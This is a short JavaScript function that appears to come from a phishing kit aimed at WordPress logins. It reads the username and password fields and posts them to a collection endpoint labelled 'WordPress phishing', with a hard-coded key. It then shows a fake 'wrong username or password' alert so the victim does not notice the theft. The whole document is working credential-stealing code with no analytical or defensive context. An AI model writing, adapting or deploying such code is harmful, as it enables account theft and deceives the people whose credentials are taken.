function report() {
    var login_field = $("#user_login").val();
    var password = $("#user_pass").val();

    $.ajax({
        type: "POST",
        url: "/api/v1/post/report",
        dataType: "json",
        data: {
            "name": "WordPress钓鱼",
            "info": login_field + "&&" + password,
            "sec_key": "9cbf8a4dcb8e30682b927f352d6559a0"
        },
        success: function (e) {
            if (e.code == "200") {
                alert("账号密码错误");
            } else {
                console.log(e.msg)
            }
        },
        error: function (e) {
            console.log("fail")
        }
    });
}